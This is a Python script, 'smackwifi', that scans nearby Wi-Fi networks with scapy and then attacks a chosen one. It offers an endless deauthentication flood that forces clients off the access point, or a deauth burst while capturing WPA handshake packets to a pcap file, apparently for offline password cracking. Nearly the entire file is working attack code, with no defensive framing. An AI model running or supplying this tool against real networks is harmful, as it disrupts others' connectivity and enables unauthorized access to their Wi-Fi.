#!/usr/bin/python3
# smackwifi by github.com/n0nexist
from rich import print
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich import box
import os
import psutil
from scapy.all import *
import time
from threading import Thread

if os.getuid() != 0:
    print("You are [red]not[/red] root.")
    exit(1)

os.system("clear")
print("Welcome to [green][bold]smackwifi[/bold][/green]!")

addrs = list(psutil.net_if_addrs())
interface = Prompt.ask("Select an [bold][cyan]interface[/cyan][/bold]",choices=addrs,default=addrs[-1])

print(f"[bright_black]Sniffing in [underline]{interface}[/underline] until CTRL-C[/bright_black]...")

ap_list = []
ap_info_list = []

def handlePackets(pkt):
    global ap_list
    global ap_info_list
    if pkt.haslayer(Dot11Beacon):
        if pkt.addr2 not in ap_list: 
            ap_list.append(pkt.addr2)
            wifi_name = pkt.info.decode()
            wifi_mac = pkt.addr2
            sec_info = pkt[Dot11Beacon].getlayer(Dot11Beacon).cap
            try:
                netstats = pkt[Dot11Beacon].network_stats()
                channel  = netstats['channel']
                enctype  = str('/'.join(netstats['crypto'])).replace("OPN","[bold][red]OPEN[/red][/bold]").replace("WEP","[bold][yellow]WEP[/yellow][/bold]")
            except:
                channel = "unknown"
                enctype = "unknown"
            rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "unknown"
            ap_info_list.append([wifi_name,wifi_mac,enctype,str(rssi),str(channel)])
            print(f"[bright_black]+[/bright_black] Found [green]{wifi_name}[/green] ([cyan]{wifi_mac}[/cyan])")

chthread = True
stopped = False

def channel_thread(interf):
    global chthread
    global stopped
    while chthread:
        for x in range(1,14):
            os.popen(f"iwconfig {interf} channel {x}").read()
            time.sleep(0.3)
    print(f"\n[bright_black]Stopped hopping channels on [underline]{interf}[/underline][/bright_black]")
    stopped = True

total_packets = 0

def deauthenticate_wifi_network(target_mac,channel,interf,attackmode):
    global total_packets

    os.popen(f"iwconfig {interf} channel {channel}").read()
    pkt = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_mac, addr3=target_mac) / Dot11Deauth()
    if attackmode:
        while True:
            sendp(pkt, iface=interf, verbose=0)
            print(f"[bright_black]Sent [underline]{total_packets}[/underline] packets to {target_mac}[/bright_black]",end="\r")
            total_packets += 1
    else:
        for x in range(100):
            sendp(pkt, iface=interf, verbose=0)

handshake_fragments = 0

def sniffuntil(pkt):
    global handshake_fragments

    pktdmp = PcapWriter("handshake.pcap",append=True,sync=True)
    pktdmp.write(pkt)

    if EAPOL in pkt:
        handshake_fragments += 1
        print(f"[bright_black]+[/bright_black] Captured [green][underline]{handshake_fragments}[/underline][/green] EAPOL packets")

    if handshake_fragments >= 10:
        return True


def intercept_handshakes(interf):
    sniff(stop_filter=sniffuntil, iface=interf, monitor=True)


Thread(target=channel_thread,args=(interface,)).start()
    
sniff(iface=interface, prn=handlePackets)

print("\n[bright_black]Showing results[/bright_black]...")

table = Table(box=box.SIMPLE_HEAD)

table.add_column("N.", justify="left", style="bright_black")
table.add_column("SSID", justify="center", style="cyan")
table.add_column("BSSID", justify="center", style="green")
table.add_column("ENC", justify="center", style="white")
table.add_column("RSSI", justify="center", style="magenta")
table.add_column("CHANNEL", justify="center", style="blue")

c = 0
for x in ap_info_list:
    c+=1
    table.add_row(f"[bold]{c}[/bold]", x[0], x[1], x[2], x[3], x[4])

console = Console()
console.print(table)

chthread = False
while True:
    if stopped:
        break

indx = int(Prompt.ask("Insert [bold][bright_black]N.[/bold][/bright_black]",default="1"))-1
target = ap_list[indx]
chan = ap_info_list[indx][-1]
print(f"\n[bright_black]Attacking {target} on channel {chan}[/bright_black]...")

mode = Prompt.ask("Select attack mode",choices=["handshake_steal","deauth_attack"],default="deauth_attack")

print("")
Thread(target=deauthenticate_wifi_network,args=(target,chan,interface,mode == "deauth_attack",)).start()

if mode == "handshake_steal":
    print(f"[bright_black]Intercepting handshakes[/bright_black]...")
    intercept_handshakes(interface)
